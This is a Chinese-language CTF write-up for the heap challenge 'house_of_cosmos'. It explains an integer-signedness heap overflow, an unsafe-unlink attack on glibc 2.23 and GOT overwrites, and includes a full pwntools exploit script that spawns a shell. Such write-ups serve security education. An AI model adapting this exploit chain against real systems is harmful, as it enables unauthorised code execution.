# house_of_cosmos

## 题目简述

程序提供 `add`、`free`、`edit` 等堆菜单功能，未开启 PIE，配套环境为 glibc 2.23。字符串读取函数的长度参数是有符号 `int`，循环变量却是无符号数；当申请长度为 0 时，条件 `i < size - 1` 发生下溢，从 `malloc(0)` 返回的小块持续向后写。利用该堆溢出在相邻块中伪造可通过检查的双向链表指针，触发 unsafe unlink 后改写全局指针表，最终覆盖 GOT 并获得 shell。

## 解题过程

漏洞函数的关键语义如下：

```c
void readStr(char *buffer, int size) {
    unsigned int i;

    for (i = 0; i < size - 1; ++i) {
        if (read(0, buffer + i, 1) != 1)
            exit(-1);
        if (buffer[i] == '\n')
            break;
    }
    buffer[i] = '\0';
}
```

`add` 允许 `size == 0`，而 glibc 的 `malloc(0)` 仍返回一个最小 chunk。此时 `size - 1` 在与无符号 `i` 比较时变成很大的正数，于是输入可以越过 0 号块覆盖后续 chunk。

先布局一个最小块和三个 `0x90` 用户大小的块。全局节点表位于固定地址 `0x4040c0`，取第二个节点槽附近的 `ptr = list + 0x10` 作为 unlink 写入目标：

```python
add(0, b"aa")       # 0，实际得到 0x20 chunk
add(0x90, b"aa")    # 1
add(0x90, b"aa")    # 2
add(0x90, b"aa")    # 3，防止与 top chunk 合并

list_addr = 0x4040C0
ptr = list_addr + 0x10

fake_chunk = flat(
    0,
    0x91,
    ptr - 0x18,      # fd
    ptr - 0x10,      # bk
).ljust(0x90, b"a")

payload = (
    b"a" * 0x10
    + p64(0)
    + p64(0xA1)
    + fake_chunk
    + p64(0x90)
    + p64(0xA0)
)
edit(0, payload)
free(2)
```

伪造的 `fd`、`bk` 满足旧版 glibc 的完整性检查。释放 2 号块向前合并时触发 unlink，使全局节点表中的指针反过来指向节点表自身，从而能够通过 `edit(1, ...)` 重写后续节点描述符。

把 0 号节点的缓冲区指向 `free@GOT`，把 1、2 号节点都指向 `atoi@GOT`：

```python
payload = b"a" * 8
payload += p64(elf.got["free"]) + p64(0x10)
payload += (p64(elf.got["atoi"]) + p64(0x10)) * 2
edit(1, payload)
```

先令 `free@GOT = puts@PLT`。随后执行 `free(1)`，程序实际上调用 `puts(atoi@GOT)`，泄露真实 `atoi` 地址并计算 libc 基址：

```python
edit(0, p64(elf.plt["puts"])[:-1])
free(1)

atoi_addr = u64(io.recvuntil(b"\n", drop=True).ljust(8, b"\x00"))
libc.address = atoi_addr - libc.sym["atoi"]
```

最后通过 2 号节点把 `atoi@GOT` 改成 `system`。菜单下一次把输入传给 `atoi` 时，实际执行的就是 `system(input)`，发送 `/bin/sh` 即可：

```python
edit(2, p64(libc.sym["system"])[:-1])
io.sendlineafter(b">> ", b"/bin/sh")
io.interactive()
```

整合后的 pwntools 框架如下，菜单提示应以附件中的实际字符串为准：

```python
from pwn import *


context.arch = "amd64"
elf = ELF("./house_of_cosmos", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
io = process(elf.path)


def add(size, data):
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b">> ", str(size).encode())
    io.sendlineafter(b">> ", data)


def free(index):
    io.sendlineafter(b">> ", b"2")
    io.sendlineafter(b">> ", str(index).encode())


def edit(index, data):
    io.sendlineafter(b">> ", b"4")
    io.sendlineafter(b">> ", str(index).encode())
    io.sendlineafter(b">> ", data)


add(0, b"aa")
add(0x90, b"aa")
add(0x90, b"aa")
add(0x90, b"aa")

ptr = 0x4040C0 + 0x10
fake = flat(0, 0x91, ptr - 0x18, ptr - 0x10).ljust(0x90, b"a")
edit(0, b"a" * 0x10 + flat(0, 0xA1) + fake + flat(0x90, 0xA0))
free(2)

edit(
    1,
    b"a" * 8
    + flat(elf.got["free"], 0x10)
    + flat(elf.got["atoi"], 0x10) * 2,
)
edit(0, p64(elf.plt["puts"])[:-1])
free(1)

atoi_addr = u64(io.recvuntil(b"\n", drop=True).ljust(8, b"\x00"))
libc.address = atoi_addr - libc.sym["atoi"]
edit(2, p64(libc.sym["system"])[:-1])
io.sendlineafter(b">> ", b"/bin/sh")
io.interactive()
```

官方 PDF 没有保留动态 flag。

## 方法总结

本题先由有符号/无符号混用把 `malloc(0)` 变成任意长度堆溢出，再利用 glibc 2.23 仍可用的 unsafe unlink 把全局节点表改造成任意地址读写。`free@GOT -> puts@PLT` 负责泄露，`atoi@GOT -> system` 负责执行命令。固定表地址、GOT 可写和 unlink 行为都依赖无 PIE、RELRO 状态及旧版 glibc，迁移到其他环境前必须重新核对保护和结构偏移。
